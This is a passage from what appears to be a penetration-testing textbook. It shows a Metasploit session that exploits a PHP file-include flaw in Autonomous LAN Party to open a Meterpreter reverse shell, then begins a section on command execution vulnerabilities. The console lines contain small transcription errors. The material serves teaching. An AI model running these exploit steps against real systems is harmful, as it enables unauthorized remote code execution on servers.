what is different. Metasploit is constantly evolving, make sure to use the latest SVN version for the greatest functionality.

```
File Edit View Search Terminal Help
root@kali:~# msconsole -q
msf > use exploit/unix/webapp/php_include
msf exploit(php_include) > set PHPURI 127.0.0.1
HOST 127.0.0.1
msf exploit(php_include) > set PHPURI /alp/include/bot.php?master[currentskin]=XxPathXX
PHPURI > /alp/include/bot.php?master(currentskin]=XxPathXX
msf exploit(php_include) > set payload/meterpreter/reverse_tcp
payload > php/meterpreter/reverse_tcp
msf exploit(php_include) > set LHOST 127.0.0.1
LHOST 127.0.0.1
msf exploit(php_include) > exploit
[*] Started exploit TCP handler on 127.0.0.1:4444
[*] Using URL: http://127.0.0.1:8080/MkdroqUB0d
[*] Local IP: http://172.16.15.188:8080/MkdroqUB0d
[*] PHP include server started.
[*] Sending stage (33068 bytes) to 127.0.0.1
[+] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:55888) at 2016-05-02 17:23:00 -04000
[*] Server stopped.
meterpreter > getuid
Server username: www-data (33)
```

# FIGURE 9.13 Exploiting Autonomous LAN Party.

# Command Execution Vulnerabilities

Command execution vulnerabilities allow arbitrary commands to be executed through a script due to insufficient validation checking. In this section we will explore a command execution vulnerability and see how to build a quick script to execute the arbitrary code. Not all vulnerabilities will be this straightforward, but knowing how these vulnerabilities will help us understand how to exploit them when we encounter more complicated examples in the wild.

# Command execution vulnerabilities

Command execution vulnerabilities are the result of passing poorly